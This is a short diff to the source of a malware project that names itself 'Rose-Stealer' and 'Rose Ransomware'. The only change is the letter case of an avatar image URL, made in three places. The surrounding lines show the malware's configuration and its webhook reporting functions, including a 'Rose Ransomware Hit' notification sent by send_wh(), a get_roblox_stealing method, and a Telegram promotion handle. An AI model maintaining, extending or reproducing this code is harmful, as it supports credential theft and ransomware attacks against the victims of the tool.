@@ -106,7 +106,7 @@ class Config:
 
         self.eb_color = 16711680
         self.eb_footer = "Rose-Stealer | t.me/rosegrabber"
-        self.wh_avatar = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png"
+        self.wh_avatar = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
         self.wh_name = "Rose-Stealer | t.me/rosegrabber"
 
     def get_roblox_stealing(self):
@@ -1908,7 +1908,7 @@ timestamp = datetime.now().isoformat()
 def log_error(e):
     data = {
         "username": "Rose Ransomware",
-        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png",
+        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png",
         "embeds": [
             {
                 "title": "Rose Ransomware Error",
@@ -1978,7 +1978,7 @@ Good luck"""
 def send_wh():
     data = {
         "username": "Rose Ransomware",
-        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png",
+        "avatar_url": "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png",
         "embeds": [
             {
                 "title": "Rose Ransomware Hit",
